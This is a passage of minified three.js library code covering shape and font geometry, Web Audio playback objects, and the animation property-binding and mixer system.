g=b[e],h=\nb[f],k=h.x-g.x,m=h.y-g.y;if(Math.abs(m)>Number.EPSILON){if(0>m&&(g=b[f],k=-k,h=b[e],m=-m),!(a.y<g.y||a.y>h.y))if(a.y===g.y){if(a.x===g.x)return!0}else{e=m*(a.x-g.x)-k*(a.y-g.y);if(0===e)return!0;0>e||(d=!d)}}else if(a.y===g.y&&(h.x<=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return d}var e=Ia.isClockWise,f=this.subPaths;if(0===f.length)return[];if(!0===b)return c(f);var g,h,m,k=[];if(1===f.length)return h=f[0],m=new Db,m.curves=h.curves,k.push(m),k;var l=!e(f[0].getPoints()),l=a?!l:l;m=[];var p=\n[],n=[],q=0,x;p[q]=void 0;n[q]=[];for(var r=0,A=f.length;r<A;r++)h=f[r],x=h.getPoints(),g=e(x),(g=a?!g:g)?(!l&&p[q]&&q++,p[q]={s:new Db,p:x},p[q].s.curves=h.curves,l&&q++,n[q]=[]):n[q].push({h:h,p:x[0]});if(!p[0])return c(f);if(1<p.length){r=!1;h=[];e=0;for(f=p.length;e<f;e++)m[e]=[];e=0;for(f=p.length;e<f;e++)for(g=n[e],l=0;l<g.length;l++){q=g[l];x=!0;for(A=0;A<p.length;A++)d(q.p,p[A].p)&&(e!==A&&h.push({froms:e,tos:A,hole:l}),x?(x=!1,m[A].push(q)):r=!0);x&&m[e].push(q)}0<h.length&&(r||(n=m))}r=\n0;for(e=p.length;r<e;r++)for(m=p[r].s,k.push(m),h=n[r],f=0,g=h.length;f<g;f++)m.holes.push(h[f].h);return k}};Object.assign(fe.prototype,{isFont:!0,generateShapes:function(a,b,c){void 0===b&&(b=100);void 0===c&&(c=4);var d=this.data;a=String(a).split(\"\");var e=b/d.resolution,f=(d.boundingBox.yMax-d.boundingBox.yMin+d.underlineThickness)*e,g=0,h=0;b=[];for(var m=0;m<a.length;m++){var k=a[m];if(\"\\n\"===k)g=0,h-=f;else{var l;l=e;var p=g,n=h;if(k=d.glyphs[k]||d.glyphs[\"?\"]){var q=new ee,x=[],r,A,w,y,z,\nv,D,I;if(k.o)for(var C=k._cachedOutline||(k._cachedOutline=k.o.split(\" \")),F=0,J=C.length;F<J;)switch(C[F++]){case \"m\":r=C[F++]*l+p;A=C[F++]*l+n;q.moveTo(r,A);break;case \"l\":r=C[F++]*l+p;A=C[F++]*l+n;q.lineTo(r,A);break;case \"q\":r=C[F++]*l+p;A=C[F++]*l+n;z=C[F++]*l+p;v=C[F++]*l+n;q.quadraticCurveTo(z,v,r,A);if(y=x[x.length-1]){w=y.x;y=y.y;for(var H=1;H<=c;H++){var N=H/c;Ab(N,w,z,r);Ab(N,y,v,A)}}break;case \"b\":if(r=C[F++]*l+p,A=C[F++]*l+n,z=C[F++]*l+p,v=C[F++]*l+n,D=C[F++]*l+p,I=C[F++]*l+n,q.bezierCurveTo(z,\nv,D,I,r,A),y=x[x.length-1])for(w=y.x,y=y.y,H=1;H<=c;H++)N=H/c,Bb(N,w,z,D,r),Bb(N,y,v,I,A)}l={offsetX:k.ha*l,path:q}}else l=void 0;g+=l.offsetX;b.push(l.path)}}c=[];d=0;for(a=b.length;d<a;d++)Array.prototype.push.apply(c,b[d].toShapes());return c}});Object.assign(Ue.prototype,{load:function(a,b,c,d){var e=this;(new sa(this.manager)).load(a,function(a){var c;try{c=JSON.parse(a)}catch(d){console.warn(\"THREE.FontLoader: typeface.js support is being deprecated. Use typeface.json instead.\"),c=JSON.parse(a.substring(65,\na.length-2))}a=e.parse(c);b&&b(a)},c,d)},parse:function(a){return new fe(a)}});var Pd,je={getContext:function(){void 0===Pd&&(Pd=new (window.AudioContext||window.webkitAudioContext));return Pd},setContext:function(a){Pd=a}};Object.assign(ge.prototype,{load:function(a,b,c,d){var e=new sa(this.manager);e.setResponseType(\"arraybuffer\");e.load(a,function(a){je.getContext().decodeAudioData(a,function(a){b(a)})},c,d)}});he.prototype=Object.assign(Object.create(ma.prototype),{constructor:he,isRectAreaLight:!0,\ncopy:function(a){ma.prototype.copy.call(this,a);this.width=a.width;this.height=a.height;return this}});Object.assign(Ve.prototype,{update:function(){var a,b,c,d,e,f,g,h=new S,m=new S;return function(k){if(a!==this||b!==k.focus||c!==k.fov||d!==k.aspect*this.aspect||e!==k.near||f!==k.far||g!==k.zoom){a=this;b=k.focus;c=k.fov;d=k.aspect*this.aspect;e=k.near;f=k.far;g=k.zoom;var l=k.projectionMatrix.clone(),p=this.eyeSep/2,n=p*e/b,q=e*Math.tan(N.DEG2RAD*c*.5)/g,x;m.elements[12]=-p;h.elements[12]=p;p=\n-q*d+n;x=q*d+n;l.elements[0]=2*e/(x-p);l.elements[8]=(x+p)/(x-p);this.cameraL.projectionMatrix.copy(l);p=-q*d-n;x=q*d-n;l.elements[0]=2*e/(x-p);l.elements[8]=(x+p)/(x-p);this.cameraR.projectionMatrix.copy(l)}this.cameraL.matrixWorld.copy(k.matrixWorld).multiply(m);this.cameraR.matrixWorld.copy(k.matrixWorld).multiply(h)}}()});Id.prototype=Object.create(x.prototype);Id.prototype.constructor=Id;ie.prototype=Object.assign(Object.create(x.prototype),{constructor:ie,getInput:function(){return this.gain},\nremoveFilter:function(){null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null)},getFilter:function(){return this.filter},setFilter:function(a){null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):this.gain.disconnect(this.context.destination);this.filter=a;this.gain.connect(this.filter);this.filter.connect(this.context.destination)},getMasterVolume:function(){return this.gain.gain.value},\nsetMasterVolume:function(a){this.gain.gain.value=a},updateMatrixWorld:function(){var a=new q,b=new ca,c=new q,d=new q;return function(e){x.prototype.updateMatrixWorld.call(this,e);e=this.context.listener;var f=this.up;this.matrixWorld.decompose(a,b,c);d.set(0,0,-1).applyQuaternion(b);e.positionX?(e.positionX.setValueAtTime(a.x,this.context.currentTime),e.positionY.setValueAtTime(a.y,this.context.currentTime),e.positionZ.setValueAtTime(a.z,this.context.currentTime),e.forwardX.setValueAtTime(d.x,this.context.currentTime),\ne.forwardY.setValueAtTime(d.y,this.context.currentTime),e.forwardZ.setValueAtTime(d.z,this.context.currentTime),e.upX.setValueAtTime(f.x,this.context.currentTime),e.upY.setValueAtTime(f.y,this.context.currentTime),e.upZ.setValueAtTime(f.z,this.context.currentTime)):(e.setPosition(a.x,a.y,a.z),e.setOrientation(d.x,d.y,d.z,f.x,f.y,f.z))}}()});hc.prototype=Object.assign(Object.create(x.prototype),{constructor:hc,getOutput:function(){return this.gain},setNodeSource:function(a){this.hasPlaybackControl=\n!1;this.sourceType=\"audioNode\";this.source=a;this.connect();return this},setBuffer:function(a){this.buffer=a;this.sourceType=\"buffer\";this.autoplay&&this.play();return this},play:function(){if(!0===this.isPlaying)console.warn(\"THREE.Audio: Audio is already playing.\");else if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else{var a=this.context.createBufferSource();a.buffer=this.buffer;a.loop=this.loop;a.onended=this.onEnded.bind(this);a.playbackRate.setValueAtTime(this.playbackRate,\nthis.startTime);a.start(0,this.startTime);this.isPlaying=!0;this.source=a;return this.connect()}},pause:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.source.stop(),this.startTime=this.context.currentTime,this.isPlaying=!1,this},stop:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.source.stop(),this.startTime=0,this.isPlaying=!1,this},connect:function(){if(0<\nthis.filters.length){this.source.connect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-1].connect(this.filters[a]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-1].disconnect(this.filters[a]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());\nreturn this},getFilters:function(){return this.filters},setFilters:function(a){a||(a=[]);!0===this.isPlaying?(this.disconnect(),this.filters=a,this.connect()):this.filters=a;return this},getFilter:function(){return this.getFilters()[0]},setFilter:function(a){return this.setFilters(a?[a]:[])},setPlaybackRate:function(a){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.playbackRate=a,!0===this.isPlaying&&this.source.playbackRate.setValueAtTime(this.playbackRate,\nthis.context.currentTime),this},getPlaybackRate:function(){return this.playbackRate},onEnded:function(){this.isPlaying=!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn(\"THREE.Audio: this Audio has no playback control.\"),!1):this.loop},setLoop:function(a){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.loop=a,!0===this.isPlaying&&(this.source.loop=this.loop),this},getVolume:function(){return this.gain.gain.value},\nsetVolume:function(a){this.gain.gain.value=a;return this}});ke.prototype=Object.assign(Object.create(hc.prototype),{constructor:ke,getOutput:function(){return this.panner},getRefDistance:function(){return this.panner.refDistance},setRefDistance:function(a){this.panner.refDistance=a},getRolloffFactor:function(){return this.panner.rolloffFactor},setRolloffFactor:function(a){this.panner.rolloffFactor=a},getDistanceModel:function(){return this.panner.distanceModel},setDistanceModel:function(a){this.panner.distanceModel=\na},getMaxDistance:function(){return this.panner.maxDistance},setMaxDistance:function(a){this.panner.maxDistance=a},updateMatrixWorld:function(){var a=new q;return function(b){x.prototype.updateMatrixWorld.call(this,b);a.setFromMatrixPosition(this.matrixWorld);this.panner.setPosition(a.x,a.y,a.z)}}()});Object.assign(le.prototype,{getFrequencyData:function(){this.analyser.getByteFrequencyData(this.data);return this.data},getAverageFrequency:function(){for(var a=0,b=this.getFrequencyData(),c=0;c<b.length;c++)a+=\nb[c];return a/b.length}});Jd.prototype={constructor:Jd,accumulate:function(a,b){var c=this.buffer,d=this.valueSize,e=a*d+d,f=this.cumulativeWeight;if(0===f){for(f=0;f!==d;++f)c[e+f]=c[f];f=b}else f+=b,this._mixBufferRegion(c,e,0,b/f,d);this.cumulativeWeight=f},apply:function(a){var b=this.valueSize,c=this.buffer;a=a*b+b;var d=this.cumulativeWeight,e=this.binding;this.cumulativeWeight=0;1>d&&this._mixBufferRegion(c,a,3*b,1-d,b);for(var d=b,f=b+b;d!==f;++d)if(c[d]!==c[d+b]){e.setValue(c,a);break}},\nsaveOriginalState:function(){var a=this.buffer,b=this.valueSize,c=3*b;this.binding.getValue(a,c);for(var d=b;d!==c;++d)a[d]=a[c+d%b];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(a,b,c,d,e){if(.5<=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){ca.slerpFlat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var f=1-d,g=0;g!==e;++g){var h=b+g;a[h]=a[h]*f+a[c+g]*d}}};ka.prototype={constructor:ka,getValue:function(a,\nb){this.bind();this.getValue(a,b)},setValue:function(a,b){this.bind();this.setValue(a,b)},bind:function(){var a=this.node,b=this.parsedPath,c=b.objectName,d=b.propertyName,e=b.propertyIndex;a||(this.node=a=ka.findNode(this.rootNode,b.nodeName)||this.rootNode);this.getValue=this._getValue_unavailable;this.setValue=this._setValue_unavailable;if(a){if(c){var f=b.objectIndex;switch(c){case \"materials\":if(!a.material){console.error(\"  can not bind to material as node does not have a material\",this);return}if(!a.material.materials){console.error(\"  can not bind to material.materials as node.material does not have a materials array\",\nthis);return}a=a.material.materials;break;case \"bones\":if(!a.skeleton){console.error(\"  can not bind to bones as node does not have a skeleton\",this);return}a=a.skeleton.bones;for(c=0;c<a.length;c++)if(a[c].name===f){f=c;break}break;default:if(void 0===a[c]){console.error(\"  can not bind to objectName of node, undefined\",this);return}a=a[c]}if(void 0!==f){if(void 0===a[f]){console.error(\"  trying to bind to objectIndex of objectName, but is undefined:\",this,a);return}a=a[f]}}f=a[d];if(void 0===f)console.error(\"  trying to update property for track: \"+\nb.nodeName+\".\"+d+\" but it wasn't found.\",a);else{b=this.Versioning.None;void 0!==a.needsUpdate?(b=this.Versioning.NeedsUpdate,this.targetObject=a):void 0!==a.matrixWorldNeedsUpdate&&(b=this.Versioning.MatrixWorldNeedsUpdate,this.targetObject=a);c=this.BindingType.Direct;if(void 0!==e){if(\"morphTargetInfluences\"===d){if(!a.geometry){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry\",this);return}if(!a.geometry.morphTargets){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry.morphTargets\",\nthis);return}for(c=0;c<this.node.geometry.morphTargets.length;c++)if(a.geometry.morphTargets[c].name===e){e=c;break}}c=this.BindingType.ArrayElement;this.resolvedProperty=f;this.propertyIndex=e}else void 0!==f.fromArray&&void 0!==f.toArray?(c=this.BindingType.HasFromToArray,this.resolvedProperty=f):void 0!==f.length?(c=this.BindingType.EntireArray,this.resolvedProperty=f):this.propertyName=d;this.getValue=this.GetterByBindingType[c];this.setValue=this.SetterByBindingTypeAndVersioning[c][b]}}else console.error(\"  trying to update node for track: \"+\nthis.path+\" but it wasn't found.\")},unbind:function(){this.node=null;this.getValue=this._getValue_unbound;this.setValue=this._setValue_unbound}};Object.assign(ka.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},_getValue_unbound:ka.prototype.getValue,_setValue_unbound:ka.prototype.setValue,BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(a,b){a[b]=this.node[this.propertyName]},\nfunction(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)a[b++]=c[d]},function(a,b){a[b]=this.resolvedProperty[this.propertyIndex]},function(a,b){this.resolvedProperty.toArray(a,b)}],SetterByBindingTypeAndVersioning:[[function(a,b){this.node[this.propertyName]=a[b]},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){for(var c=this.resolvedProperty,\nd=0,e=c.length;d!==e;++d)c[d]=a[b++]},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.needsUpdate=!0},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty[this.propertyIndex]=a[b]},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];\nthis.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty.fromArray(a,b)},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.matrixWorldNeedsUpdate=!0}]]});ka.Composite=function(a,b,c){c=c||ka.parseTrackName(b);this._targetGroup=a;this._bindings=a.subscribe_(b,c)};ka.Composite.prototype={constructor:ka.Composite,getValue:function(a,b){this.bind();var c=this._bindings[this._targetGroup.nCachedObjects_];\nvoid 0!==c&&c.getValue(a,b)},setValue:function(a,b){for(var c=this._bindings,d=this._targetGroup.nCachedObjects_,e=c.length;d!==e;++d)c[d].setValue(a,b)},bind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,c=a.length;b!==c;++b)a[b].bind()},unbind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,c=a.length;b!==c;++b)a[b].unbind()}};ka.create=function(a,b,c){return a&&a.isAnimationObjectGroup?new ka.Composite(a,b,c):new ka(a,b,c)};ka.parseTrackName=function(a){var b=\n/^((?:[\\w-]+[\\/:])*)([\\w-]+)?(?:\\.([\\w-]+)(?:\\[(.+)\\])?)?\\.([\\w-]+)(?:\\[(.+)\\])?$/.exec(a);if(!b)throw Error(\"cannot parse trackName at all: \"+a);b={nodeName:b[2],objectName:b[3],objectIndex:b[4],propertyName:b[5],propertyIndex:b[6]};if(null===b.propertyName||0===b.propertyName.length)throw Error(\"can not parse propertyName from trackName: \"+a);return b};ka.findNode=function(a,b){if(!b||\"\"===b||\"root\"===b||\".\"===b||-1===b||b===a.name||b===a.uuid)return a;if(a.skeleton){var c=function(a){for(var c=\n0;c<a.bones.length;c++){var d=a.bones[c];if(d.name===b)return d}return null}(a.skeleton);if(c)return c}if(a.children){var d=function(a){for(var c=0;c<a.length;c++){var g=a[c];if(g.name===b||g.uuid===b||(g=d(g.children)))return g}return null};if(c=d(a.children))return c}return null};me.prototype={constructor:me,isAnimationObjectGroup:!0,add:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._paths,g=this._parsedPaths,h=this._bindings,m=h.length,k=0,l=\narguments.length;k!==l;++k){var p=arguments[k],n=p.uuid,q=e[n];if(void 0===q){q=c++;e[n]=q;b.push(p);for(var n=0,x=m;n!==x;++n)h[n].push(new ka(p,f[n],g[n]))}else if(q<d){var r=--d,x=b[r];e[x.uuid]=q;b[q]=x;e[n]=r;b[r]=p;n=0;for(x=m;n!==x;++n){var z=h[n],w=z[q];z[q]=z[r];void 0===w&&(w=new ka(p,f[n],g[n]));z[r]=w}}else void 0!==b[q]&&console.error(\"Different objects with the same UUID detected. Clean the caches or recreate your infrastructure when reloading scenes...\")}this.nCachedObjects_=d},remove:function(a){for(var b=\nthis._objects,c=this.nCachedObjects_,d=this._indicesByUUID,e=this._bindings,f=e.length,g=0,h=arguments.length;g!==h;++g){var m=arguments[g],k=m.uuid,l=d[k];if(void 0!==l&&l>=c){var p=c++,n=b[p];d[n.uuid]=l;b[l]=n;d[k]=p;b[p]=m;m=0;for(k=f;m!==k;++m){var n=e[m],q=n[l];n[l]=n[p];n[p]=q}}}this.nCachedObjects_=c},uncache:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._bindings,g=f.length,h=0,m=arguments.length;h!==m;++h){var k=arguments[h].uuid,l=e[k];\nif(void 0!==l)if(delete e[k],l<d){var k=--d,p=b[k],n=--c,q=b[n];e[p.uuid]=l;b[l]=p;e[q.uuid]=k;b[k]=q;b.pop();p=0;for(q=g;p!==q;++p){var x=f[p],r=x[n];x[l]=x[k];x[k]=r;x.pop()}}else for(n=--c,q=b[n],e[q.uuid]=l,b[l]=q,b.pop(),p=0,q=g;p!==q;++p)x=f[p],x[l]=x[n],x.pop()}this.nCachedObjects_=d},subscribe_:function(a,b){var c=this._bindingsIndicesByPath,d=c[a],e=this._bindings;if(void 0!==d)return e[d];var f=this._paths,g=this._parsedPaths,h=this._objects,l=this.nCachedObjects_,k=Array(h.length),d=e.length;\nc[a]=d;f.push(a);g.push(b);e.push(k);c=l;for(d=h.length;c!==d;++c)k[c]=new ka(h[c],a,b);return k},unsubscribe_:function(a){var b=this._bindingsIndicesByPath,c=b[a];if(void 0!==c){var d=this._paths,e=this._parsedPaths,f=this._bindings,g=f.length-1,h=f[g];b[a[g]]=c;f[c]=h;f.pop();e[c]=e[g];e.pop();d[c]=d[g];d.pop()}}};ne.prototype={constructor:ne,play:function(){this._mixer._activateAction(this);return this},stop:function(){this._mixer._deactivateAction(this);return this.reset()},reset:function(){this.paused=\n!1;this.enabled=!0;this.time=0;this._loopCount=-1;this._startTime=null;return this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},startAt:function(a){this._startTime=a;return this},setLoop:function(a,b){this.loop=a;this.repetitions=b;return this},setEffectiveWeight:function(a){this.weight=a;this._effectiveWeight=this.enabled?\na:0;return this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(a){return this._scheduleFading(a,0,1)},fadeOut:function(a){return this._scheduleFading(a,1,0)},crossFadeFrom:function(a,b,c){a.fadeOut(b);this.fadeIn(b);if(c){c=this._clip.duration;var d=a._clip.duration,e=c/d;a.warp(1,d/c,b);this.warp(e,1,b)}return this},crossFadeTo:function(a,b,c){return a.crossFadeFrom(this,b,c)},stopFading:function(){var a=this._weightInterpolant;null!==a&&(this._weightInterpolant=\nnull,this._mixer._takeBackControlInterpolant(a));return this},setEffectiveTimeScale:function(a){this.timeScale=a;this._effectiveTimeScale=this.paused?0:a;return this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(a){this.timeScale=this._clip.duration/a;return this.stopWarping()},syncWith:function(a){this.time=a.time;this.timeScale=a.timeScale;return this.stopWarping()},halt:function(a){return this.warp(this._effectiveTimeScale,0,a)},warp:function(a,\nb,c){var d=this._mixer,e=d.time,f=this._timeScaleInterpolant,g=this.timeScale;null===f&&(this._timeScaleInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;f=f.sampleValues;d[0]=e;d[1]=e+c;f[0]=a/g;f[1]=b/g;return this},stopWarping:function(){var a=this._timeScaleInterpolant;null!==a&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(a));return this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||\nthis._mixer._root},_update:function(a,b,c,d){var e=this._startTime;if(null!==e){b=(a-e)*c;if(0>b||0===c)return;this._startTime=null;b*=c}b*=this._updateTimeScale(a);c=this._updateTime(b);a=this._updateWeight(a);if(0<a){b=this._interpolants;for(var e=this._propertyBindings,f=0,g=b.length;f!==g;++f)b[f].evaluate(c),e[f].accumulate(d,a)}},_updateWeight:function(a){var b=0;if(this.enabled){var b=this.weight,c=this._weightInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&\n(this.stopFading(),0===d&&(this.enabled=!1))}}return this._effectiveWeight=b},_updateTimeScale:function(a){var b=0;if(!this.paused){var b=this.timeScale,c=this._timeScaleInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopWarping(),0===b?this.paused=!0:this.timeScale=b)}}return this._effectiveTimeScale=b},_updateTime:function(a){var b=this.time+a;if(0===a)return b;var c=this._clip.duration,d=this.loop,e=this._loopCount;if(2200===d)a:{if(-1===e&&(this._loopCount=\n0,this._setEndings(!0,!0,!1)),b>=c)b=c;else if(0>b)b=0;else break a;this.clampWhenFinished?this.paused=!0:this.enabled=!1;this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0>a?-1:1})}else{d=2202===d;-1===e&&(0<=a?(e=0,this._setEndings(!0,0===this.repetitions,d)):this._setEndings(0===this.repetitions,!0,d));if(b>=c||0>b){var f=Math.floor(b/c),b=b-c*f,e=e+Math.abs(f),g=this.repetitions-e;0>g?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,b=0<a?c:0,this._mixer.dispatchEvent({type:\"finished\",\naction:this,direction:0<a?1:-1})):(0===g?(a=0>a,this._setEndings(a,!a,d)):this._setEndings(!1,!1,d),this._loopCount=e,this._mixer.dispatchEvent({type:\"loop\",action:this,loopDelta:f}))}if(d&&1===(e&1))return this.time=b,c-b}return this.time=b},_setEndings:function(a,b,c){var d=this._interpolantSettings;c?(d.endingStart=2401,d.endingEnd=2401):(d.endingStart=a?this.zeroSlopeAtStart?2401:2400:2402,d.endingEnd=b?this.zeroSlopeAtEnd?2401:2400:2402)},_scheduleFading:function(a,b,c){var d=this._mixer,e=d.time,\nf=this._weightInterpolant;null===f&&(this._weightInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;f=f.sampleValues;d[0]=e;f[0]=b;d[1]=e+a;f[1]=c;return this}};cd.prototype={constructor:cd,clipAction:function(a,b){var c=b||this._root,d=c.uuid,e=\"string\"===typeof a?qa.findByName(c,a):a,c=null!==e?e.uuid:a,f=this._actionsByClip[c],g=null;if(void 0!==f){g=f.actionByRoot[d];if(void 0!==g)return g;g=f.knownActions[0];null===e&&(e=g._clip)}if(null===e)return null;e=new ne(this,e,b);this._bindAction(e,\ng);this._addInactiveAction(e,c,d);return e},existingAction:function(a,b){var c=b||this._root,d=c.uuid,c=\"string\"===typeof a?qa.findByName(c,a):a,c=this._actionsByClip[c?c.uuid:a];return void 0!==c?c.actionByRoot[d]||null:null},stopAllAction:function(){for(var a=this._actions,b=this._nActiveActions,c=this._bindings,d=this._nActiveBindings,e=this._nActiveBindings=this._nActiveActions=0;e!==b;++e)a[e].reset();for(e=0;e!==d;++e)c[e].useCount=0;return this},update:function(a){a*=this.timeScale;for(var b=\nthis._actions,c=this._nActiveActions,d=this.time+=a,e=Math.sign(a),f=this._accuIndex^=1,g=0;g!==c;++g){var h=b[g];h.enabled&&h._update(d,a,e,f)}a=this._bindings;b=this._nActiveBindings;for(g=0;g!==b;++g)a[g].apply(f);return this},getRoot:function(){return this._root},uncacheClip:function(a){var b=this._actions;a=a.uuid;var c=this._actionsByClip,d=c[a];if(void 0!==d){for(var d=d.knownActions,e=0,f=d.length;e!==f;++e){var g=d[e];this._deactivateAction(g);var h=g._cacheIndex,l=b[b.length-1];g._cacheIndex=\nnull;g._byClipCacheIndex=null;l._cacheIndex=h;b[h]=l;b.pop();this._removeInactiveBindingsForAction(g)}delete c[a]}},uncacheRoot:function(a){a=a.uuid;var b=this._actionsByClip,c;for(c in b){var d=b[c].actionByRoot[a];void 0!==d&&(this._deactivateAction(d),this._removeInactiveAction(d))}c=this._bindingsByRootAndName[a];if(void 0!==c)for(var e in c)a=c[e],a.restoreOriginalState(),this._removeInactiveBinding(a)},uncacheAction:function(a,b){var c=this.existingAction(a,b);null!==c&&(this._deactivateAction(c),\nthis._removeInactiveAction(c))}};Object.assign(cd.prototype,{_bindAction:function(a,b){var c=a._localRoot||this._root,d=a._clip.tracks,e=d.length,f=a._propertyBindings,g=a._interpolants,h=c.uuid,l=this._bindingsByRootAndName,k=l[h];void 0===k&&(k={},l[h]=k);for(l=0;l!==e;++l){var q=d[l],p=q.name,n=k[p];if(void 0===n){n=f[l];if(void 0!==n){null===n._cacheIndex&&(++n.referenceCount,this._addInactiveBinding(n,h,p));continue}n=new Jd(ka.create(c,p,b&&b._propertyBindings[l].binding.parsedPath),q.ValueTypeName,\nq.getValueSize());++n.referenceCount;this._addInactiveBinding(n,h,p)}f[l]=n;g[l].resultBuffer=n.buffer}},_activateAction:function(a){if(!this._isActiveAction(a)){if(null===a._cacheIndex){var b=(a._localRoot||this._root).uuid,c=a._clip.uuid,d=this._actionsByClip[c];this._bindAction(a,d&&d.knownActions[0]);this._addInactiveAction(a,c,b)}b=a._propertyBindings;c=0;for(d=b.length;c!==d;++c){var e=b[c];0===e.useCount++&&(this._lendBinding(e),e.saveOriginalState())}this._lendAction(a)}},_deactivateAction:function(a){if(this._isActiveAction(a)){for(var b=\na._propertyBindings,c=0,d=b.length;c!==d;++c){var e=b[c];0===--e.useCount&&(e.restoreOriginalState(),this._takeBackBinding(e))}this._takeBackAction(a)}},_initMemoryManager:function(){this._actions=[];this._nActiveActions=0;this._actionsByClip={};this._bindings=[];this._nActiveBindings=0;this._bindingsByRootAndName={};this._controlInterpolants=[];this._nActiveControlInterpolants=0;var a=this;this.stats={actions:{get total(){return a._actions.length},get inUse(){return a._nActiveActions}},bindings:{get total(){return a._bindings.length},\nget inUse(){return a._nActiveBindings}},controlInterpolants:{get total(){return a._controlInterpolants.length},get inUse(){return a._nActiveControlInterpolants}}}},_isActiveAction:function(a){a=a._cacheIndex;return null!==a&&a<this._nActiveActions},_addInactiveAction:function(a,b,c){var d=this._actions,e=this._actionsByClip,f=e[b];void 0===f?(f={knownActions:[a],actionByRoot:{}},a._byClipCacheIndex=0,e[b]=f):(b=f.knownActions,a._byClipCacheIndex=b.length,b.push(a));a._cacheIndex=d.length;d.push(a);\nf.actionByRoot[c]=a},_removeInactiveAction:function(a){var b=this._actions,c=b[b.length-1],d=a._cacheIndex;c._cacheIndex=d;b[d]=c;b.pop();a._cacheIndex=null;var c=a._clip.uuid,d=this._actionsByClip,e=d[c],f=e.knownActions,g=f[f.length-1],h=a._byClipCacheIndex;g._byClipCacheIndex=h;f[h]=g;f.pop();a._byClipCacheIndex=null;delete e.actionByRoot[(b._localRoot||this._root).uuid];0===f.length&&delete d[c];this._removeInactiveBindingsForAction(a)},_removeInactiveBindingsForAction:function(a){a=a._propertyBindings;\nfor(var b=0,c=a.length;b!==c;++b){var d=a[b];0===--d.referenceCount&&this._removeInactiveBinding(d)}},_lendAction:function(a){var b=this._actions,c=a._cacheIndex,d=this._nActiveActions++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackAction:function(a){var b=this._actions,c=a._cacheIndex,d=--this._nActiveActions,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_addInactiveBinding:function(a,b,c){var d=this._bindingsByRootAndName,e=d[b],f=this._bindings;void 0===e&&(e={},d[b]=\ne);e[c]=a;a._cacheIndex=f.length;f.push(a)},_removeInactiveBinding:function(a){var b=this._bindings,c=a.binding,d=c.rootNode.uuid,c=c.path,e=this._bindingsByRootAndName,f=e[d],g=b[b.length-1];a=a._cacheIndex;g._cacheIndex=a;b[a]=g;b.pop();delete f[c];a:{for(var h in f)break a;delete e[d]}},_lendBinding:function(a){var b=this._bindings,c=a._cacheIndex,d=this._nActiveBindings++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackBinding:function(a){var 